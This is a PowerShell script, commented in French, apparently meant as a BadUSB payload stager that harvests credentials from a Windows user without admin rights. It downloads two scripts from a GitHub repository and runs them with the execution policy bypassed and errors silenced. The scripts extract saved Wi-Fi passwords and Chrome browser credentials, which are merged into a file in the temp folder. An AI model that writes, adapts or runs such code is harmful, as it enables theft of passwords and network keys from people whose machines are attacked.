# Plan A BadUSB : Wi-Fi + Chrome filesystem — sans admin, sans UAC.
# Sortie unique : %TEMP%\credz-leonardo.txt
param(
    [switch]$UseLocalScripts
)

$ErrorActionPreference = 'SilentlyContinue'
$Root = 'https://raw.githubusercontent.com/BL4CK-SUN/Ducky/main'
$ScriptsDir = $PSScriptRoot

function Find-LeonardoPwsh {
    $c = Get-Command pwsh -ErrorAction SilentlyContinue
    if ($c) { return $c.Source }
    $p = Join-Path ${env:ProgramFiles} 'PowerShell\7\pwsh.exe'
    if (Test-Path -LiteralPath $p) { return $p }
    return $null
}

function Test-MediumUser {
    try {
        return -not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
            [Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch { return $true }
}

$wifiSrc = Join-Path $env:TEMP 'wifi-extract.ps1'
$chromeSrc = Join-Path $env:TEMP 'chrome-extract.ps1'

if ($UseLocalScripts) {
    Copy-Item -LiteralPath (Join-Path $ScriptsDir 'wifi-extract.ps1') -Destination $wifiSrc -Force
    Copy-Item -LiteralPath (Join-Path $ScriptsDir 'chrome-extract.ps1') -Destination $chromeSrc -Force
} else {
    try {
        Invoke-WebRequest -Uri "$Root/wifi-extract.ps1" -UseBasicParsing -OutFile $wifiSrc
        Invoke-WebRequest -Uri "$Root/chrome-extract.ps1" -UseBasicParsing -OutFile $chromeSrc
    } catch {
        throw "Telechargement payloads echoue : $($_.Exception.Message)"
    }
}

& powershell.exe -NoProfile -ExecutionPolicy Bypass -File $wifiSrc -NoNotepad
if ($LASTEXITCODE -ne 0) { Write-Warning "wifi-extract exit $LASTEXITCODE" }

$pwsh = Find-LeonardoPwsh
if ($pwsh) {
  & $pwsh -NoProfile -ExecutionPolicy Bypass -File $chromeSrc -NoNotepad
} else {
    Join-Path $env:TEMP 'chrome-leonardo.txt' | ForEach-Object {
        @(
            "Chrome export $(Get-Date -Format o)"
            'SKIP: pwsh 7+ absent (requis pour AesGcm).'
        ) | Set-Content -LiteralPath $_ -Encoding utf8
    }
}

$wifiOut = Join-Path $env:TEMP 'wifi-leonardo.txt'
$chromeOut = Join-Path $env:TEMP 'chrome-leonardo.txt'
$credzOut = Join-Path $env:TEMP 'credz-leonardo.txt'

$merged = [System.Collections.Generic.List[string]]::new()
$merged.Add('Credz export (Plan A — sans admin) ' + (Get-Date -Format 'o'))
$merged.Add('Jeton admin : ' + ($(if (Test-MediumUser) { 'non (OK)' } else { 'OUI — relancer sans elevation' })))
$merged.Add('')
foreach ($pair in @(@('--- Wi-Fi ---', $wifiOut), @('--- Chrome ---', $chromeOut))) {
    $merged.Add($pair[0])
    if (Test-Path -LiteralPath $pair[1]) {
        Get-Content -LiteralPath $pair[1] | ForEach-Object { $merged.Add($_) }
    } else {
        $merged.Add('(fichier absent: ' + $pair[1] + ')')
    }
    $merged.Add('')
}

$merged | Set-Content -LiteralPath $credzOut -Encoding utf8
Start-Process notepad.exe -ArgumentList $credzOut
Write-Output $credzOut